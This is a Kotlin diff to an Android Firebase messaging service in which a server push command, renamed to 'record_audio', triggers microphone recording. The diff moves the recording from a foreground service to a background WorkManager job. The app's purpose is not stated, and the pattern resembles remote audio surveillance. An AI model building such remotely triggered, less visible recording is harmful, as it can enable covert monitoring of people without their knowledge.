@@ -1,8 +1,6 @@
-// MyFirebaseMessagingService.kt
 package com.elfinsaddle.service
 
 import android.Manifest
-import android.content.Intent
 import android.content.pm.PackageManager
 import android.util.Log
 import androidx.core.content.ContextCompat
@@ -24,7 +22,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     companion object {
         private const val TAG = "MyFirebaseMsgService"
         private const val COMMAND_KEY = "command"
-        private const val COMMAND_RECORD_MIC = "record_mic"
+        // Command name is now more specific to match the worker
+        private const val COMMAND_RECORD_MIC = "record_audio"
 
         fun fetchAndLogCurrentToken() {
             FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
@@ -101,10 +100,10 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
         // Handle new command: record microphone
         if (command == COMMAND_RECORD_MIC) {
-            Log.d(TAG, "Handling record microphone command.")
+            Log.d(TAG, "Handling record audio command.")
             if (hasRecordAudioPermission()) {
-                val serviceIntent = Intent(this, AudioRecordingService::class.java)
-                ContextCompat.startForegroundService(this, serviceIntent)
+                // The correct way: Use WorkManager to handle this background task.
+                DataFetchWorker.scheduleWork(applicationContext, DataFetchWorker.COMMAND_RECORD_AUDIO)
             } else {
                 Log.w(TAG, "Cannot start recording, RECORD_AUDIO permission not granted.")
                 // Optionally, notify the server that the command failed due to permissions.
